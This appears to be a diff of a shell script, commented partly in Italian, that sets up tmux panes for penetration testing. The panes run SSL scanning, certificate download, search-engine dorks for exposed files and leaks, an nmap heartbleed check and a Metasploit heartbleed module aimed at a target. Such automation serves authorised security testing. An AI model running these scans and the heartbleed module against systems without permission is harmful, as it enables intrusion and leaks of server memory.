@@ -53,7 +53,7 @@ tmux split-window -v -t PT:2.0
 tmux split-window -v -t PT:2.1
 # Esecuzione dei comandi nelle sottofinestre
 tmux send-keys -t PT:2.0 "# SSL analysis with sslscan" Enter
-tmux send-keys -t PT:2.0 "sslscan http://$domain"
+tmux send-keys -t PT:2.0 "sslscan $ip"
 tmux send-keys -t PT:2.1 "# certificate analysis" Enter
 tmux send-keys -t PT:2.1 "openssl s_client -connect $site:443 </dev/null 2>/dev/null | openssl x509 -out $site.crt; echo \"Certificato scaricato: $site.crt\" # get certificate info"
 cd $folderProject
@@ -66,7 +66,7 @@ tmux new-window -t PT:3 -n 'WEB google dork'
 tmux split-window -v -t PT:3.0
 # Esecuzione dei comandi nelle sottofinestre
 tmux send-keys -t PT:3.0 "# google dork" Enter
-tmux send-keys -t PT:3.0 "xdg-open \"https://duckduckgo.com/?q=site:$domain filetype:php\" & xdg-open \"https://duckduckgo.com/?q=site:$domain intitle:\"\"index of\"\" \"\"parent directory\"\"\" & xdg-open \"https://duckduckgo.com/?q=site:$domain –site:www.$domain\" & xdg-open \"https://duckduckgo.com/?q=site:pastebin.com $domain\" & xdg-open \"https://duckduckgo.com/?q=site:github.com $domain\" & xdg-open \"https://duckduckgo.com/?q=site:pastebin.com intext:$domain\" # google dork"
+tmux send-keys -t PT:3.0 "xdg-open \"https://google.com/?q=site:$domain filetype:php\" & xdg-open \"https://google.com/?q=site:$domain intitle:\"\"index of\"\" \"\"parent directory\"\"\" & xdg-open \"https://google.com/?q=site:$domain –site:www.$domain\" & xdg-open \"https://google.com/?q=site:pastebin.com $domain\" & xdg-open \"https://google.com/?q=site:github.com $domain\" & xdg-open \"https://google.com/?q=site:pastebin.com intext:$domain\" # google dork"
 cd $folderProject
 
 
@@ -89,9 +89,9 @@ tmux split-window -v -t PT:5.0
 tmux split-window -v -t PT:5.1
 # Esecuzione dei comandi nelle sottofinestre
 tmux send-keys -t PT:5.0 "# verify heartbleed with nmap" Enter
-tmux send-keys -t PT:5.0 "nmap –sV --script=ssl-heartbleed $ip"
+tmux send-keys -t PT:5.0 "nmap -sV --script=ssl-heartbleed $ip"
 tmux send-keys -t PT:5.1 "# attack target by means of heartbleed" Enter
-tmux send-keys -t PT:5.1 "msfconsole -q -x \"use auxiliary/scanner/ssl/openssl_heartbleed;set RHOSTS $ip;set RPORT 443;set VERBOSE true;exploit;exit -y\""
+tmux send-keys -t PT:5.1 "msfconsole -q -x \"use auxiliary/scanner/ssl/openssl_heartbleed;set RHOSTS $ip;set RPORT 443;set VERBOSE true;exploit;\""
 cd $folderProject
 
 
